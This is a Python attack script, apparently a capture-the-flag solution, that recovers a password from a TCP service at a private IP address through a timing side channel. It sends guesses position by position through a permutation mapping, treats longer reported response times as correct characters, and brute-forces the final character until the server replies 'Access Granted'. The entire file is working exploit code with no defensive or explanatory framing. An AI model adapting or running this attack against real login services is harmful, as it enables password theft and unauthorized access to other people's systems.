import socket
import math

# charset = [
#     'a','b','c','d','e','f','g','h','i','j','k','l','m',
#     'n','o','p','q','r','s','t','u','v','w','x','y','z',
#     '{','}','=','_'
# ]

charset= [
    '{', '}', '_', 'i', 'a', 't', 'h', 'e', 'f', 'l', 'a', 'g', '='
]
PRIME = 19


def query_server(ip, port, guess, position):
    """Send guess and check if timing increased (prefix matched)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, int(port)))

    sock.sendall(guess.encode())
    sock.shutdown(socket.SHUT_WR)

    while True:
        data = sock.recv(4096)
        if not data:
            break

        msg = data.decode("UTF-8")

        if "=" in msg:
            elapsed = float(msg.strip().split("=")[1])
            if math.floor(elapsed) > position + 1:
                sock.close()
                return True

    sock.close()
    return False


def check_final(ip, port, guess):
    """Check if password is correct using Access Granted."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, int(port)))

    sock.sendall(guess.encode())
    sock.shutdown(socket.SHUT_WR)

    while True:
        data = sock.recv(4096)
        if not data:
            break

        msg = data.decode("UTF-8")
        if msg.startswith("Access Granted"):
            sock.close()
            return True

    sock.close()
    return False


HOST = "10.21.235.18"
PORT = "5555"

# permutation mapping
mapping = [(7*i + 4) % PRIME for i in range(PRIME)]

recovered = ["=" for _ in range(PRIME)]

print("Starting timing attack...\n")

# Recover first 15 characters using timing
for hpos in range(0, 15):
    target_index = mapping[hpos]

    for ch in charset:
        trial = recovered.copy()
        trial[target_index] = ch
        candidate = "".join(trial)

        if query_server(HOST, PORT, candidate, hpos):
            recovered[target_index] = ch
            print(f"[+] Position {target_index} discovered: {ch}")
            break

    print("Current guess:", "".join(recovered))


# Final character brute force using Access Granted
last_pos = 15
target_index = mapping[last_pos]

for ch in charset:
    trial = recovered.copy()
    trial[target_index] = ch
    candidate = "".join(trial)

    if check_final(HOST, PORT, candidate):
        recovered[target_index] = ch
        print(f"[+] Final character found: {ch}")
        break


print("\nRecovered password:", "".join(recovered))